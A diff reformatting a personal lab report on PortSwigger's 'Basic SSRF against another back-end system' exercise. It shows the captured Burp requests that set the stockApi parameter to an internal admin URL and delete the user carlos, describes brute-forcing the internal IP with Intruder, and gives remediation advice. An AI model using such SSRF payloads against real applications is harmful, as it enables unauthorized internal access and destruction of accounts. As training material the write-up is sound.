@@ -1,22 +1,12 @@
 # PortSwigger Web Security Academy Lab Report: Basic SSRF Against Another Back-End System
 
-
-
-
 **Report ID:** PS-LAB-SSRF-002  
-
 **Author:** Abhi (Abhiram)  
-
 **Date:** February 13, 2026  
-
 **Lab Level:** Apprentice  
-
 **Lab Title:** Basic SSRF against another back-end system
 
-
-
-
-## Executive Summary:
+## Executive Summary
 
 **Vulnerability Type:** Server-Side Request Forgery (SSRF) – Basic / Internal Network Access  
 
@@ -30,25 +20,15 @@ Unauthorized access to internal networks, admin panels, or other back-end servic
 
 **Status:** Exploited in controlled lab environment only; no real-world impact. Educational purposes.
 
+## Environment and Tools Used
 
+- **Target:** Simulated e-commerce site from PortSwigger Web Security Academy (`https://*.web-security-academy.net`)
+- **Browser:** Google Chrome (Version 120.0 or similar)
+- **Tools:** Burp Suite Community Edition (Version 2023.12 or similar) – Proxy, Repeater, Intruder
+- **Operating System:** Windows 11
+- **Test Date/Time:** February 13, 2026, approximately 10:44 AM IST
 
-
-## Environment and Tools Used:
-
-**Target:** Simulated e-commerce site from PortSwigger Web Security Academy (`https://*.web-security-academy.net`)
-
-**Browser:** Google Chrome (Version 120.0 or similar)
-
-**Tools:** Burp Suite Community Edition (Version 2023.12 or similar) – Proxy, Repeater, Intruder
-
-**Operating System:** Windows 11
-
-**Test Date/Time:** February 13, 2026, approximately 10:44 AM IST
-
-
-
-
-## Methodology:
+## Methodology
 
 Conducted following ethical hacking best practices in a simulated environment.
 
@@ -63,25 +43,23 @@ Conducted following ethical hacking best practices in a simulated environment.
 6. Modified `stockApi` to `http://192.168.0.XX:8080/admin/delete?username=carlos` → sent → user deleted.
 7. Lab solved (green banner: "Congratulations, you solved the lab!").
 
+## Detailed Findings
 
+**Vulnerable Endpoint:** `POST /product/stock` (stock check)
 
-
-## Detailed Findings:
-
-**Vulnerable Endpoint:** 
-`POST /product/stock` (stock check)
-
-**Original Request (Captured in Burp):**
+### Original Request (Captured in Burp)
 
 ```http
 POST /product/stock HTTP/2
 Host: 0ae3002803aef186809c354400340003.web-security-academy.net
 Cookie: session=Q9n7eU2KT6zIgGFFzQs5LPmsQz57swIL
 Content-Type: application/x-www-form-urlencoded
+
 stockApi=http://192.168.0.64:8080/admin
 
 
-Reflected Output:
+
+Reflected Output (Admin Panel via SSRF)
 
 HTTP/2 200 OK
 Content-Type: text/html; charset=utf-8
@@ -101,32 +79,26 @@ Content-Length: 3243
 </html>
 
 
-Modified Request:
+Modified Request (Delete User carlos)
 
 POST /product/stock HTTP/2
 Host: 0ae3002803aef186809c354400340003.web-security-academy.net
 Cookie: session=Q9n7eU2KT6zIgGFFzQs5LPmsQz57swIL
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 62
-stockApi=http://192.168.0.64:8080/admin/delete?username=carlos
 
+stockApi=http://192.168.0.64:8080/admin/delete?username=carlos
 
 Response:
 
 HTTP/2 200 OK
 Content-Type: text/html; charset=utf-8
 
-<!DOCTYPE html>
-<!-- Lab header: "SOLVED" status -->
-<p>User deleted successfully!</p>
-<h1>Users</h1>
-<div>wiener - <a href="/admin/delete?username=wiener">Delete</a></div>
-<!-- Carlos account removed 
+User deleted successfully!
 
 
 
-
-Proof of Exploitation:
+Proof of Exploitation
 
 
 ![Proof of SSRF Error]()
@@ -134,38 +106,29 @@ Proof of Exploitation:
 Figure 1: Burp Intruder scan showing status 200 on valid IP (admin interface found).
 
 
-
-![Proof of Successful SSRF Exploitation](https://github.com/abhiram507/PortSwigger-SSRF-Lab-2/blob/4be58f94d438134d170ae9e6e40f45456db9fdf9/PortSwigger%20SSRF%20Lab%202%20success.png)
+![Proof of Successful SSRF Exploitation]()
 
 Figure 2: Successful deletion of user 'carlos'.
 
 
-
-![Lab Solved Congratulations](https://github.com/abhiram507/PortSwigger-SSRF-Lab-2/blob/61c2ea540c2716f0f745d822f8dcfc2ca655de8b/PortSwigger%20SSRF%20Lab%202%20Lab%20Completion.png)
+![Lab Solved Congratulations]()
 
 Figure 3: PortSwigger Academy confirmation – "Congratulations, you solved the lab!"
 
 
 
-
-Exploitation Explanation:
+Exploitation Explanation
 
 The application trusts the stockApi URL and fetches it server-side, returning the response. No IP filtering prevents access to internal RFC 1918 ranges (192.168.0.0/16). Intruder brute-forced the last octet (1–255) on port 8080 to find the admin service. Once located, direct request to /admin/delete?username=carlos performed the action.
 
 
 
-
-Risk Assessment:
+Risk Assessment
 
 Likelihood: High (user-controlled URL, no validation)
 Impact: High to Critical — internal network scanning, unauthorized access, potential exfiltration or escalation
 Affected Components: Stock check backend fetch logic
-
-
-
-
-Recommendations for Remediation:
-
+Recommendations for Remediation
 Validate URLs strictly (allowlist trusted external domains only).
 Block private/internal IPs (RFC 1918: 192.168.x.x, 10.x.x.x, 172.16–31.x.x; localhost; metadata endpoints).
 Use network segmentation / firewall rules to prevent the app from accessing internal resources.
@@ -175,8 +138,7 @@ Regular scanning (Burp Scanner, ZAP) and code reviews.
 
 
 
-
-Conclusion and Lessons Learned:
+Conclusion and Lessons Learned
 
 This lab demonstrated basic SSRF against internal back-end systems: scan private IP ranges via Intruder, access hidden admin panels, and perform privileged actions.
 
@@ -189,8 +151,7 @@ Strengthened skills in SSRF detection, scanning, and exploitation.
 
 
 
-
-References:
+References
 
 PortSwigger Academy: Basic SSRF against another back-end system
 OWASP: Server-Side Request Forgery (SSRF)
